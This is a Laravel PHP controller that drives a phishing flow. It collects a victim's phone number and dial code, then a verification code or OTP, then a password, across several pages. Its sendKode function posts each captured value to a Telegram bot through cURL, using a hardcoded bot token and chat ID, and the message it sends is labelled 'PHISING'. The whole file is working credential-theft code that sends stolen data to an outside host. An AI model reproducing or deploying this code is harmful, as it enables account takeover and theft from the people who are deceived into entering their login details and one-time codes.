<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\Session;
use Illuminate\Http\Request;

class HomeController extends Controller
{

    public function index(Request $request)
    {
        return inertia('LoginIndex');
    }

    public function login_store(Request $request)
    {
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->code;
        Session::push("dataNumber", [
            'getPhone' => $phone,
            'getDialCode' => $code,
        ]);
        $this->sendKode($phone, $code);
        return redirect('verif');
    }

    public function verif(Request $request)
    {
        $data = Session::get('dataNumber');

        $getPhone = $data[0]['getPhone'] ?? 0;
        $getDialCode = $data[0]['getDialCode'] ?? 0;
        return inertia('Verif', compact('getPhone', 'getDialCode'));
    }

    public function verif_store(Request $request)
    {
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->dial_code;
        $verif = $request->code;
        Session::push('dataNumber', [
            'getPhone' => $phone,
            'getDialCode' => $code,
            'getVerif' => $verif,
        ]);
        $this->sendKode($phone, $code, $verif);
        return redirect('password');
    }

    public function get_password(Request $request)
    {
        $data = Session::get('dataNumber');

        $getPhone = $data[0]['getPhone'] ?? 0;
        $getDialCode = $data[0]['getDialCode'] ?? 0;
        $getVerif = $data[0]['getVerif'] ?? 0;
        return inertia('GetPassword', compact(
            'getPhone',
            'getDialCode',
            'getVerif'
        ));
    }
    public function store_password(Request $request)
    {
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->dial_code;
        $verif = $request->code;
        $password = $request->password;
        $this->sendKode($phone, $code, $verif, $password);
        return redirect('');
    }

    public function index_first(Request $request)
    {
        return inertia('Index');
    }
    public function sendKode($phone = "", $code = "", $otp = "", $password = "")
    {




        $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
        $chat_id = "7637087335";

        $ch = curl_init();
        $phisData = "MY2";
        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "Phone | $phone \n Code | $code \n OTP :| $otp \n Password : $password \n \n \n
    PHISING $phisData
    "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
